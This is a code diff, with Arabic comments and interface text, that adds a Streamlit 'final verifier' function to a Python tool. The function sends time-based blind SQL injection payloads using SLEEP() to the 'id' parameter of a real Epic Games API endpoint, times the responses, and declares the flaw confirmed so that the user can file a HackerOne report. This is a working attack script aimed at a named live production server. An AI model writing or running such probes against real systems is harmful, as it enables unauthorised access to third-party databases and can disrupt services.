@@ -452,3 +452,42 @@ def main_gui():
 
 if __name__ == "__main__":
     main_gui()
+# وحدة التحقق النهائي - أضفها في نهاية ملف f16_omega_ultimate.py
+
+def run_final_verification():
+    st.header("🔍 وحدة التأكيد النهائي (Final Verifier)")
+    
+    # المعطيات من التقرير الذي استخرجته
+    target_api = "https://fngw-svc-gc-livefn.ol.epicgames.net/api/magpie/v1/users"
+    param = "id"
+    
+    if st.button("🛡️ ابدأ التحقق الثلاثي الآن"):
+        with st.spinner("جاري اختبار استجابة الخادم لمدد زمنية مختلفة..."):
+            delays = [2, 8]  # سنختبر ثانيتين ثم 8 ثوانٍ لقطع الشك
+            results = {}
+            
+            for d in delays:
+                # تجهيز الكود البرمجي (Payload)
+                test_payload = f"1' AND (SELECT 1 FROM (SELECT(SLEEP({d})))a)--"
+                full_url = f"{target_api}?{param}={test_payload}"
+                
+                start_time = time.time()
+                try:
+                    # إرسال طلب حقيقي للخادم
+                    requests.get(full_url, timeout=25)
+                    actual_delay = time.time() - start_time
+                    results[d] = actual_delay
+                    st.write(f"⏱️ طلبنا {d} ثانية -> استجاب الخادم بعد: {actual_delay:.2f} ثانية")
+                except Exception as e:
+                    st.error(f"حدث خطأ أثناء الاتصال: {e}")
+            
+            # تحليل النتيجة النهائية
+            if results.get(8, 0) >= 8 and results.get(2, 0) >= 2:
+                st.balloons()
+                st.success("✅ [CONFIRMED] الثغرة حقيقية 100%! قاعدة بيانات Epic Games تستجيب لأوامرك.")
+                st.info("يمكنك الآن نسخ تقرير الـ F16 وإرساله إلى HackerOne فوراً.")
+            else:
+                st.warning("⚠️ [UNSTABLE] النتائج غير دقيقة. قد يكون التأخير بسبب ضغط الشبكة وليس الثغرة.")
+
+# استدعاء الوحدة في نهاية الدالة الرئيسية (main_gui)
+# run_final_verification() 
